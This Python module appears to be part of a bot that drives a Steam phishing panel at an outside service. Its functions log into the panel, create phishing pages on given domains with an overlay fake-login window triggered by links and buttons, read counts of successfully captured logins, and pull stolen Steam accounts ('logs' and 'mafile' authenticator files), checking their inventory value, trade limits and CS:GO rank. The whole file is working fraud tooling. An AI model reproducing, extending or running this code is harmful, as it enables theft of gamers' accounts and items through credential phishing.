import requests

import bot_misc.config as cfg


def get_last_log(token):
    r = requests.get(
        'https://steam.twofish.cc/api/SteamAccount/GetSteamAccounts?GuardTypes=0&page=1&pageSize=1',
        headers={'Authorization': f'Bearer {token}'}).json()

    log_id = r['steamAccounts']['items'][0]['id']

    r = requests.get(
        f'https://steam.twofish.cc/api/SteamAccount/GetSteamAccount?id={log_id}',
        headers={'Authorization': f'Bearer {token}'}).json()

    balance = r['steamAccount']['totalSumInventoryPrice']

    status = 'Есть' if r['steamAccount']['hasLimit'] == True else 'Нету'

    link = r['steamAccount']['siteName'] + '/' + r['steamAccount']['pageName']

    level = r['steamAccount']['level']

    games = r['steamAccount']['games']

    to_ret_game = []

    rank = '0'

    for i in games:
        if 'primeType' in i:
            to_ret_game.append('csgo' + ('_no_prime.png' if i['primeType'] == False else '_prime_new.png'))
            rank = i['competiveMode']['rank']

        if i['name'] == 'Rust':
            to_ret_game.append('rust.jpg')


    print(balance, status, link, level)

    if len(to_ret_game) < 1:
        to_ret_game.append(f'Total {len(games)} games')

    print('Games:', to_ret_game)

    inv = r['steamAccount']['totalSumInventoryPrice']

    if inv < 40:
        return {'id': '#' + str(log_id),
                'link': link,
                'balance': str(balance) + '$',
                'status': status,
                'level': level,
                'games': to_ret_game,
                'inventory_price': str(inv) + '$',
                'csgoRank': rank,
                'type': 'log'
                }

    return {'id': log_id,
            'link': link,
            'balance': r['steamAccount']['totalSumInventoryPrice'],
            'type': 'mafile'
            }


def create_link(token, ref, design, domain):
    r = requests.post('https://sites.twofish.cc/api/Sites/AddPage', json={
        "authMethod": "overlay",
        "authWindowStyle": "new",
        "domainName": domain.replace('https://', '').replace('/', ''),
        "templateId": design,
        "createSsl": True,
        "authTriggeredHtmlTags": [
            "a", "button"
        ],
        "pageName": ref
    }, headers={
        'Authorization': f'Bearer {token}'
    })

    print(r.json())

    return domain + ref


def get_stat(link, token):
    sites = requests.get('https://sites.twofish.cc/api/Sites/GetSites?page=1&pageSize=50',
                         headers={'Authorization': f'Bearer {token}'}).json()

    temp_l = link.replace('https://', '', 1)

    for i in sites['sites']['items']:
        if i['domainName'] == temp_l.split('/')[0]:
            print(i['domainName'])
            for l in i['pages']:
                print(l['name'], link.replace(temp_l.split('/')[0], '').replace('https://', ''))
                if l['name'] == link.replace(temp_l.split('/')[0], '').replace('https://', '').replace('/', '', 1):
                    print(l['loadedCount'], l['authOpenCount'], l['authesCount'], l['successAuthesCount'])
                    return [l['loadedCount'], l['authOpenCount'], l['authesCount'], l['successAuthesCount']]


def login_to_panel(username, password):
    r = requests.post('https://identity.twofish.cc/api/Account/Login', json={
        "userName": username,
        "password": password
    })

    return r.json().get('accessToken')


#token = login_to_panel(cfg.panel_username, cfg.panel_password)
#print(token)
#
#sites = requests.get('https://sites.twofish.cc/api/Sites/GetSites?page=1&pageSize=50',
#                     headers={'Authorization': f'Bearer {token}'}).json()
#
#create_link(token, '5718957813758913')

#print(sites)